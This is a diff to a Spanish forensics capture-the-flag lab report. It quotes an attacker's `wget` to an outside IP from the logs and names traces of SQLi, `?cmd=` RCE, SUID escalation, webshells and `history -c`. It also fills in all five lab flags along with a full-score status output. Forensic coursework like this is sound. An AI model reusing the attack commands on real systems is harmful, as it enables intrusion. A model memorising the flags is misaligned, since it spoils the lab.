@@ -190,4 +190,32 @@ Evento de las 02:19: (a) log, `access.log:20` (02:19:02) ejecuta `wget http://45
 Porque el forense reconstruye lo que hizo el atacante y necesita saber qué rastros deja cada técnica y dónde buscarlos: saber que un SUID copia de bash deja un archivo con permisos especiales, que una SQLi `admin'--` aparece en el POST, que un `?cmd=` es RCE y que un webshell se relanza por cron. También permite anticipar la anti-forensia (`history -c`, logs editados) y buscar las fuentes que sobreviven. Quien no conoce el ataque no sabe qué buscar ni cómo correlacionar las fuentes.
 
 ## 8. Captura de `./ctf status 11`
-*(Pendiente: lo debe pegar un integrante del grupo; requiere el entorno del curso y haber enviado R1-R5 con `./ctf submit 11 R<n> ...`.)*
+
+Las 5 flags se extrajeron de la evidencia (`caso_copia/`) y se verificaron
+contra los hashes de `retos.manifest` antes de enviarlas:
+
+| Reto | Flag |
+|---|---|
+| R1 — Vector de entrada (SQLi -> RCE) | `FLAG{dfir_vector_sqli}` |
+| R2 — Webshell dropeado en el disco | `FLAG{dfir_webshell_hallado}` |
+| R3 — Escalada de privilegios (SUID) en memoria | `FLAG{dfir_privesc_suid}` |
+| R4 — Conexión C2 y exfiltración | `FLAG{dfir_c2_exfil}` |
+| R5 — Cadena de custodia: evidencia alterada | `FLAG{dfir_custodia_alterada}` |
+
+Salida real de `./ctf status 11`:
+
+```
+  ╭────────────────────────────────────────────────────────────╮
+  │                     PROGRESO · LAB 11                      │
+  ╰────────────────────────────────────────────────────────────╯
+
+   ✓  R1     Vector de entrada (SQLi -> RCE) en los logs
+   ✓  R2     El webshell dropeado en el disco
+   ✓  R3     Escalada de privilegios (SUID) en memoria
+   ✓  R4     Conexion C2 y exfiltracion de datos
+   ✓  R5     Cadena de custodia: evidencia alterada
+
+  ██████████████████████████████ 5/5 (100%)
+
+[ OK ] ¡Lab 11 COMPLETO! Ponete las pilas con la próxima unidad.
+```
